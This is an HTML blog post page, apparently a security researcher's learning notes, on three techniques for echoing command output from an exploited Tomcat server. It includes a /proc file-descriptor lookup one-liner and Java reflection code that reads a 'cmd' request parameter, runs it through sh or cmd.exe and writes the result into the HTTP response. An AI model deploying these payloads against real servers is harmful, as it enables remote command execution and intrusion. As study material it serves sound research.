@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>Tomcat几种回显 | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="Tomcat几种回显文件描述符回显00theway师傅的思路 https:&#x2F;&#x2F;www.00theway.org&#x2F;2020&#x2F;01&#x2F;17&#x2F;java-god-s-eye&#x2F; 在LINUX环境下，可以通过文件描述符”&#x2F;proc&#x2F;self&#x2F;fd&#x2F;i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。 只要获取当前请求">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat几种回显">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/03/06/TomcatEcho/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="Tomcat几种回显文件描述符回显00theway师傅的思路 https:&#x2F;&#x2F;www.00theway.org&#x2F;2020&#x2F;01&#x2F;17&#x2F;java-god-s-eye&#x2F; 在LINUX环境下，可以通过文件描述符”&#x2F;proc&#x2F;self&#x2F;fd&#x2F;i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。 只要获取当前请求">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2022-03-06T11:14:04.000Z">
+<meta property="article:modified_time" content="2022-03-08T05:45:05.099Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">Tomcat几种回显</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2022-03-06</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~8.12K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1646718305099"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%87%A0%E7%A7%8D%E5%9B%9E%E6%98%BE"><span class="toc-number">1.</span> <span class="toc-text">Tomcat几种回显</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.</span> <span class="toc-text">文件描述符回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ThreadLocal-Response%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.</span> <span class="toc-text">通过ThreadLocal Response回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8-Response%E5%9B%9E%E6%98%BE"><span class="toc-number">1.3.</span> <span class="toc-text">通过全局存储 Response回显</span></a></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <h1 id="Tomcat几种回显"><a href="#Tomcat几种回显" class="headerlink" title="Tomcat几种回显"></a>Tomcat几种回显</h1><h2 id="文件描述符回显"><a href="#文件描述符回显" class="headerlink" title="文件描述符回显"></a>文件描述符回显</h2><p>00theway师傅的思路</p>
+<p><a target="_blank" rel="noopener" href="https://www.00theway.org/2020/01/17/java-god-s-eye/">https://www.00theway.org/2020/01/17/java-god-s-eye/</a></p>
+<p>在LINUX环境下，可以通过文件描述符”/proc/self/fd/i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。</p>
+<p>只要获取当前请求的对应进程的文件描述符，在输出描述符中写入内容就能够回显。</p>
+<p>如何获得描述符？</p>
+<p>可以通过下面的命令获取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=`cat /proc/<span class="variable">$PPID</span>/net/tcp6|awk <span class="string">&#x27;&#123;if($10&gt;0)print&#125;&#x27;</span>|grep -i %s|awk <span class="string">&#x27;&#123;print $10&#125;&#x27;</span>`</span><br><span class="line">b=`ls -l /proc/<span class="variable">$PPID</span>/fd|grep 7200A8C0|awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>`</span><br><span class="line"><span class="built_in">echo</span> -n <span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+
+<p>整合之后是这样</p>
+<p>在实际使用过程中注意把客户端IP地址转换成16进制字节倒序，替换xxxx字符串。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;a=`cat /proc/$PPID/net/tcp6|awk &#x27;&#123;if($10&gt;0)print&#125;&#x27;|grep -i xxxx|awk &#x27;&#123;print $10&#125;&#x27;`;b=`ls -l /proc/$PPID/fd|grep $a|awk &#x27;&#123;print $9&#125;&#x27;`;echo -n $b&quot;</span>&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">java.io.InputStreamReader isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num = Integer.valueOf(stringBuilder.toString()).intValue();</span><br><span class="line"></span><br><span class="line">cmd = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls /&quot;</span>&#125;;</span><br><span class="line">in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String ret = stringBuilder.toString();</span><br><span class="line">java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;Integer.TYPE&#125;);</span><br><span class="line">c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(num)&#125;));</span><br><span class="line">os.write(ret.getBytes());</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure>
+
+<p>这一段简单逻辑：执行获取描述符的命令，存入num。通过反射获取了FileDescriptor的构造器，参数为num，之后反射实例化，通过wirte方法写入我们执行的<code>&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;ls /&quot;</code>的内容达到回显。</p>
+<h2 id="通过ThreadLocal-Response回显"><a href="#通过ThreadLocal-Response回显" class="headerlink" title="通过ThreadLocal Response回显"></a>通过ThreadLocal Response回显</h2><p>kingkk师傅的思路</p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/">https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/</a></p>
+<p>整合之后</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">Field modifiersField = Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>);</span><br><span class="line">ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>);</span><br><span class="line">String cmd = lastServicedRequest != <span class="keyword">null</span></span><br><span class="line">    ? lastServicedRequest.get().getParameter(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123;</span><br><span class="line">    lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">    lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">    WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">    ServletResponse responseFacade = lastServicedResponse.get();</span><br><span class="line">    responseFacade.getWriter();</span><br><span class="line">    java.io.Writer w = responseFacade.getWriter();</span><br><span class="line">    Field responseField = ResponseFacade.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">    responseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Response response = (Response) responseField.get(responseFacade);</span><br><span class="line">    Field usingWriter = Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">    usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    usingWriter.set((Object) response, Boolean.FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">    String osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">        isLinux = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">    String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    w.write(output);</span><br><span class="line">    w.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路：</p>
+<ul>
+<li>1.通过翻阅函数调用栈寻找存储Response的类</li>
+<li>2.最好是个静态变量，这样不需要获取对应的实例，毕竟获取对象还是挺麻烦的</li>
+<li>3.使用ThreadLocal保存的变量，在获取的时候更加方便，不会有什么错误</li>
+<li>4.修复原有输出，通过分析源码找到问题所在</li>
+</ul>
+<p>这里涉及到通过反射修改private static final修饰的属性，参考下面的文章。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p>
+<p>因为自身基础问题，学习之前还不知道ThreadLocal类的作用，可以参考下面文章。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6fc3bba12f38">https://www.jianshu.com/p/6fc3bba12f38</a></p>
+<p>但简单来说ThreadLocal可以在一个线程中传递同一个对象。利用此特点获取我们要的response。</p>
+<p>ApplicationFilterChain类的internalDoFilter有对ThreadLocal的赋值操作</p>
+<p><img src="https://img.le1a.com/2022/02/25/e10ca9b9c3ec0.png" alt="1645763225491.png"></p>
+<p>拆开看</p>
+<p>这一段是通过反射来改变private static final值的过程，这里还没有赋值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD ==Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">Field modifiersField = Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这一段从lastServicedResponse变量中获取tomcat Response变量</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>);</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">ServletResponse responseFacade = lastServicedResponse.get();</span><br></pre></td></tr></table></figure>
+
+<p>这里初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal，先判断是否为null，不是null就不要初始化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123;</span><br><span class="line">           lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">           lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">           WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后是Response类的getWriter的一个问题，</p>
+<p><img src="https://img.le1a.com/2022/02/25/f3a52726cf171.png" alt="1645798491417.png"></p>
+<p>文档描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @return the writer associated with this Response.</span><br><span class="line"> *</span><br><span class="line"> * @exception IllegalStateException if &lt;code&gt;getOutputStream&lt;/code&gt; has</span><br><span class="line"> *  already been called for this response</span><br><span class="line"> * @exception IOException if an input/output error occurs</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
+
+<p>看上方文档描述。如果已经调用过getWriter则再次调用会报错，判断方法是如果</p>
+<p><code>usingWriter</code>是true则已经调用过</p>
+<p><img src="https://img.le1a.com/2022/02/25/7135648d45641.png" alt="1645798628707.png"></p>
+<p>所以需要反射修改<code>usingWriter</code>的值，对应的就是下面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Field responseField = ResponseFacade.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">responseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Response response = (Response) responseField.get(responseFacade);</span><br><span class="line">Field usingWriter = Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">usingWriter.set((Object) response, Boolean.FALSE);</span><br></pre></td></tr></table></figure>
+
+<p>整合之后就是我们最上面放的回显。</p>
+<p><img src="https://img.le1a.com/2022/02/24/3a8c3bc3e7b0e.png" alt="1645711099373.png"></p>
+<h2 id="通过全局存储-Response回显"><a href="#通过全局存储-Response回显" class="headerlink" title="通过全局存储 Response回显"></a>通过全局存储 Response回显</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114625962">https://zhuanlan.zhihu.com/p/114625962</a></p>
+<p>是在<code>org.apache.coyote.http11.Http11Processor</code>中</p>
+<p><img src="https://img.le1a.com/2022/02/27/8262d0ad6a959.png" alt="1645926348708.png"></p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2022/03/06/TomcatEcho/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2022/03/06/TomcatEcho/";
+            const title         = "「Tomcat几种回显」";
+            const excerpt       = `Tomcat几种回显文件描述符回显00theway师傅的思路
+https://www.00theway.org/2020/01/17/java-god-s-eye/
+在LINUX环境下，可以通过文件描述符”/proc/self/fd/...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2022-03-08</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 《深入理解java虚拟机》读书笔记1-类文件结构" href="/2022/03/01/《深入理解java虚拟机》读书笔记1-类文件结构/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" Spring IOC学习" href="/2022/03/07/Spring-IOC/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
